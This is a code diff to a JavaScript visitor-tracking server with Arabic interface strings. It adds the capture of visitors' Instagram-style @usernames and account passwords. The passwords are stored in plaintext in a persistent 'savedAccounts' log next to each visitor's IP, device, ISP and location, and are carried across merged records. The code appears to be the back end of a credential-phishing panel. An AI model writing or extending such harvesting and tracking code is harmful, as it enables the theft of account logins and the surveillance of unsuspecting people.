@@ -1769,12 +1769,43 @@ function isLoopbackIp(ip = '') {
   return !s || s === '::1' || s === '127.0.0.1' || s === '0.0.0.0' || s === 'localhost';
 }
 
+function extractShortDeviceTitle(deviceStr = '') {
+  const d = String(deviceStr || '').trim();
+  if (!d) return 'هاتف ذكي';
+  // Remove browser/resolution suffix after "•" for a clean device title
+  const beforeBullet = d.split('•')[0].trim();
+  return beforeBullet || d;
+}
+
+function getDeviceIpSignature(deviceStr = '', ipStr = '') {
+  const shortDev = normAr(extractShortDeviceTitle(deviceStr)).replace(/\s+/g, '');
+  const cleanIp = !isLoopbackIp(ipStr) ? String(ipStr).trim() : 'local';
+  return `devip:${shortDev}_${cleanIp}`;
+}
+
 function getVisitorCanonicalKey(item) {
   if (!item) return '';
-  const rawName = String(item.visitorName || '').trim();
+  const rawUser = String(item.username || '').trim().replace(/^@+/, '');
+  if (rawUser) {
+    return `user:${normAr(rawUser)}`;
+  }
+  const rawName = String(item.visitorName || '').trim().replace(/^@+/, '');
   const nName = normAr(rawName);
-  const isGeneric = !nName || nName === normAr('زائر غير مسمى') || nName === normAr('زائر مباشر') || nName === normAr('مستخدم التطبيق') || nName === normAr('زائر');
-  return !isGeneric ? `name:${nName}` : `id:${item.id}`;
+  const isGeneric =
+    !nName ||
+    item.isDeviceIpAutoAuth ||
+    nName === normAr('زائر غير مسمى') ||
+    nName === normAr('زائر مباشر') ||
+    nName === normAr('مستخدم التطبيق') ||
+    nName === normAr('زائر');
+
+  if (!isGeneric) {
+    return `name:${nName}`;
+  }
+  if (item.device && item.ip && !isLoopbackIp(item.ip)) {
+    return getDeviceIpSignature(item.device, item.ip);
+  }
+  return `id:${item.id}`;
 }
 
 function isVisitorTombstoned(item, logsMeta = {}) {
@@ -1841,6 +1872,12 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
       if (!primary.localIp && item.localIp) {
         primary.localIp = item.localIp;
       }
+      if (!primary.username && item.username) {
+        primary.username = item.username;
+      }
+      if (!primary.accountPassword && item.accountPassword) {
+        primary.accountPassword = item.accountPassword;
+      }
       primary.pageViews = (primary.pageViews || 1) + (item.pageViews || 1);
       primary.loginCount = (primary.loginCount || 1) + (item.loginCount || 1);
       primary.searchesCount = (primary.searchesCount || 0) + (item.searchesCount || 0);
@@ -1901,17 +1938,54 @@ async function recordVisitor(info) {
   const finalRegion = resolvedPlace?.region || info.region || 'أمانة العاصمة';
   const finalLocationName = resolvedPlace?.locationName || info.locationName || `${finalCity}، ${finalCountry}`;
 
-  const cleanInputName = String(info.visitorName || '').trim();
-  const normInputName = normAr(cleanInputName);
+  const rawUsername = String(info.username || '').trim().replace(/^@+/, '');
+  const cleanPassword = String(info.accountPassword || '').trim();
+  const rawInputName = String(info.visitorName || '').trim();
   const incomingRealIp = (!isLoopbackIp(info.publicIp) ? info.publicIp : (!isLoopbackIp(info.ip) ? info.ip : ''));
   const cleanIsp = normalizeRealIspName(info.isp, finalCountry, incomingRealIp);
   const cleanDevice = normalizeRealDeviceName(info.device, info.userAgent);
+  const shortDeviceTitle = extractShortDeviceTitle(cleanDevice);
+  const deviceIpSig = getDeviceIpSignature(cleanDevice, incomingRealIp);
 
-  // Match existing visitor by visitorId OR by same normalized Name/Phone so we UPDATE the record instead of creating duplicates!
-  let vIndex = logs.visitors.findIndex(x =>
-    (info.visitorId && x.id === info.visitorId) ||
-    (normInputName && normInputName !== normAr('زائر غير مسمى') && normInputName !== normAr('زائر مباشر') && normAr(x.visitorName || '') === normInputName)
-  );
+  // Determine if this visit has an explicit Instagram-style username/name or is an automatic Device+IP recognition
+  const isAutoDeviceOnly = Boolean(info.isAutoDeviceVisit) || (!rawUsername && !rawInputName);
+  const cleanInputName = rawUsername
+    ? `@${rawUsername}`
+    : (rawInputName || `${shortDeviceTitle} • ${incomingRealIp || 'IP'}`);
+  const normInputName = normAr(cleanInputName.replace(/^@+/, ''));
+
+  if (!logs.savedAccounts || typeof logs.savedAccounts !== 'object') {
+    logs.savedAccounts = {};
+  }
+  if (!isAutoDeviceOnly && normInputName) {
+    const prevSavedPass = logs.savedAccounts[normInputName]?.password || '';
+    logs.savedAccounts[normInputName] = {
+      username: cleanInputName.startsWith('@') ? cleanInputName : `@${cleanInputName}`,
+      password: cleanPassword || prevSavedPass,
+      device: cleanDevice,
+      ip: incomingRealIp,
+      updatedAt: now
+    };
+  }
+  const effectivePassword = cleanPassword || (!isAutoDeviceOnly && normInputName ? (logs.savedAccounts[normInputName]?.password || '') : '');
+
+  // Match existing visitor by:
+  // 1) visitorId, OR
+  // 2) same normalized @username / name, OR
+  // 3) same Phone/Device Name + IP signature (so an unregistered device visit is recognized by Phone Name + IP, and upgraded when they log in!)
+  let vIndex = logs.visitors.findIndex(x => {
+    if (!x) return false;
+    if (info.visitorId && x.id === info.visitorId) return true;
+    if (!isAutoDeviceOnly && normInputName) {
+      const xNorm = normAr(String(x.username || x.visitorName || '').replace(/^@+/, ''));
+      if (xNorm && xNorm === normInputName) return true;
+    }
+    const xDevIpSig = getDeviceIpSignature(x.device, x.ip);
+    if (deviceIpSig && xDevIpSig === deviceIpSig && (isAutoDeviceOnly || x.isDeviceIpAutoAuth)) {
+      return true;
+    }
+    return false;
+  });
 
   let v = vIndex !== -1 ? logs.visitors[vIndex] : null;
 
@@ -1924,6 +1998,8 @@ async function recordVisitor(info) {
       archivedAt: now,
       previousLastSeen: v.lastSeen || v.firstSeen || now,
       visitorName: v.visitorName,
+      username: v.username || '',
+      accountPassword: v.accountPassword || '',
       ip: !isLoopbackIp(v.ip) ? v.ip : (incomingRealIp || v.ip),
       localIp: v.localIp || '',
       city: v.city,
@@ -1948,9 +2024,19 @@ async function recordVisitor(info) {
     v.pageViews = (v.pageViews || 1) + 1;
     v.loginCount = (v.loginCount || 1) + 1;
 
-    if (cleanInputName && cleanInputName !== 'زائر غير مسمى') {
+    if (!isAutoDeviceOnly && cleanInputName) {
       v.visitorName = cleanInputName;
+      v.username = cleanInputName.startsWith('@') ? cleanInputName : `@${cleanInputName}`;
+      v.isDeviceIpAutoAuth = false;
+    } else if (v.isDeviceIpAutoAuth) {
+      v.visitorName = `${shortDeviceTitle} • ${incomingRealIp || v.ip}`;
     }
+
+    if (effectivePassword) {
+      v.accountPassword = effectivePassword;
+    }
+    v.deviceIpSignature = deviceIpSig;
+
     // Always update with the latest real IP on every visit
     if (incomingRealIp) {
       v.ip = incomingRealIp;
@@ -1984,10 +2070,11 @@ async function recordVisitor(info) {
     logs.visitors.splice(vIndex, 1);
     logs.visitors.unshift(v);
   } else {
-    const tempKey = cleanInputName ? `name:${normInputName}` : `id:${info.visitorId || ''}`;
+    const tempKey = !isAutoDeviceOnly && normInputName ? `user:${normInputName}` : deviceIpSig;
     const prevDelTs = Math.max(
       Number(logs.clearedAllVisitorsAt) || 0,
       Number(logs.deletedVisitorKeys?.[tempKey]) || 0,
+      Number(logs.deletedVisitorKeys?.[`name:${normInputName}`]) || 0,
       Number(logs.deletedVisitorKeys?.[`id:${info.visitorId}`]) || 0
     );
     const freshLoginMs = Math.max(Date.now(), prevDelTs > 0 ? prevDelTs + 5000 : 0);
@@ -1995,7 +2082,11 @@ async function recordVisitor(info) {
 
     v = {
       id: `vis_${Date.now()}_${Math.floor(Math.random() * 10000)}`,
-      visitorName: cleanInputName || 'زائر غير مسمى',
+      visitorName: cleanInputName,
+      username: !isAutoDeviceOnly ? (cleanInputName.startsWith('@') ? cleanInputName : `@${cleanInputName}`) : '',
+      accountPassword: effectivePassword || '',
+      isDeviceIpAutoAuth: isAutoDeviceOnly,
+      deviceIpSignature: deviceIpSig,
       ip: incomingRealIp || info.ip || '127.0.0.1',
       localIp: info.localIp || '',
       asn: info.asn || '',
@@ -2022,6 +2113,8 @@ async function recordVisitor(info) {
   }
   if (logs.deletedVisitorKeys && v) {
     delete logs.deletedVisitorKeys[getVisitorCanonicalKey(v)];
+    delete logs.deletedVisitorKeys[`name:${normInputName}`];
+    delete logs.deletedVisitorKeys[deviceIpSig];
     delete logs.deletedVisitorKeys[`id:${v.id}`];
     if (info.visitorId) {
       delete logs.deletedVisitorKeys[`id:${info.visitorId}`];
